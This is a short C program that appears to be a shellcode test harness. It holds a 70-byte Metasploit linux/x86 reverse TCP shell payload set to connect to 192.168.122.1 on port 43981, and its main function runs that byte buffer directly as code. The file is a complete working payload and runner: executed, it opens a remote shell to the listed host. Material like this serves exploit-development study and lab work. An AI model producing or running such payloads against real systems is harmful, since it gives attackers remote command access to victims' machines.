#include <stdio.h>

/*
 * linux/x86/shell_reverse_tcp2 - 70 bytes
 * http://www.metasploit.com
 * VERBOSE=false, LHOST=192.168.122.1, LPORT=43981, 
 * ReverseConnectRetries=5, ReverseAllowProxy=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf[] = 
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93"
"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x7a\x01"
"\x66\x68\xab\xcd\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89"
"\xe1\x43\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

void main() {
    printf("shellcode length:   %d\n", sizeof(buf)-1);
    ((int(*)())buf)();
}
